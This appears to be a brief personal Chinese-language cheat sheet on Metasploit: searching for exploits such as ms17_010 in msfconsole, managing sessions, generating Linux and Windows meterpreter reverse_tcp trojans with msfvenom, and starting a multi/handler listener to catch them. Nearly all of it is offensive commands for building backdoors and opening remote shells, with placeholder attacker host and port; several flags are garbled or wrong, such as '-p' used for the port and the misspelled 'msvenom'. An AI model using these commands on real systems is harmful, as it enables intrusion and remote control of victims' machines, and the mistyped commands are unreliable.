---
title: msf使用
date: 2023-09-04 21:48:57
---
# msf使用

metasploit

## 流程

`msfconsole`

1. `search [ms17_010]` 查找漏洞

2. `use []` 选择漏洞

3. `show options` 查看参数

4. `session` 查看会话

   `session [num]` 选择会话

```shell
run vnc

```

## 后门

`msvenom -p [payload] lhost=[] lport=[] -f(format) exe -o(output) file_name.exe`

## 监听

`use exploit/multi/handler`

# 攻击主机

![image-20221223144819404](/home/wray/.config/Typora/typora-user-images/image-20221223144819404.png)

### 生成木马

linux : `msvenom -p linux/x64/meterpreter/reverse_tcp lhost=[host] -p=[port] -f elf -o .elf`

win: `msvenom -p windows/meterpreter/reverse_tcp lhost=[host] -p=[port] -f exe -o .exe`

### 监听木马

`handler -p [] lhost=[] -p []`



`use exploit/multi/handler`

`set`

`run`